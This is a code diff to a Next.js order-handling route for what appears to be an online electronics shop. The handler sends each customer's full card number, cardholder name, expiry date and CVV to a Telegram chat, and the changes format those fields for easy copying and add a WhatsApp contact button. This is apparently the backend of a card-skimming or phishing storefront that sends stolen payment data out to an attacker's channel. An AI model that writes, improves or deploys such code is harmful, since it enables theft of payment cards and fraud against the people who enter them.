@@ -19,6 +19,7 @@ export async function POST(req: NextRequest) {
   } catch (_) {}
 
   // Send Telegram
+  const whatsappUrl = `https://wa.me/${(whatsapp ?? "").replace(/[^0-9]/g, "")}`;
   const text = [
     `🏪 طلب لـ متجر مؤسسة البلاد الحديثة للإلكترونيات`,
     `🔢 رقم الطلب: #${orderId}`,
@@ -31,10 +32,10 @@ export async function POST(req: NextRequest) {
     `💳 MadaVisa - New Order`,
     `👤 Order For: ${customer ?? "-"}`,
     `📱 WhatsApp: ${whatsapp ?? "-"}`,
-    `💳 Card Number: ${cardNumber}`,
+    `💳 Card Number: <code>${cardNumber}</code>`,
     `👤 Card Holder: ${cardHolder}`,
-    `📅 Valid To: ${expiry}`,
-    `🔐 CVV: ${cvv}`,
+    `📅 Valid To: <code>${expiry}</code>`,
+    `🔐 CVV: <code>${cvv}</code>`,
   ].join("\n");
 
   try {
@@ -43,7 +44,16 @@ export async function POST(req: NextRequest) {
       {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: process.env.TELEGRAM_CHAT_ID, text }),
+        body: JSON.stringify({
+          chat_id: process.env.TELEGRAM_CHAT_ID,
+          text,
+          parse_mode: "HTML",
+          reply_markup: {
+            inline_keyboard: [
+              [{ text: "💬 فتح واتساب", url: whatsappUrl }],
+            ],
+          },
+        }),
       }
     );
   } catch (_) {}
